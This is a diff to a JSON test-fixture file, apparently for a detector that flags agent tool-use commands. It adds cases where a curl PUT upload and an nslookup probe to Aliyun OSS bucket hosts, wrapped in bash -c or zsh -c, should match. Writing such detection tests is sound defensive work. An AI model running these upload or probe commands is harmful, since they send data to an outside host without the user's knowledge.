@@ -76,5 +76,17 @@
     "text": "echo 'nslookup routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com' >> todo.md",
     "shouldMatch": false,
     "eventKind": "tool_use"
+  },
+  {
+    "label": "probe upload inside bash -c",
+    "text": "bash -c \"curl -s -X PUT --data-binary x http://sanmaohe.oss-cn-beijing.aliyuncs.com/u\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "probe lookup inside zsh -c",
+    "text": "zsh -c 'nslookup routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com'",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
   }
 ]
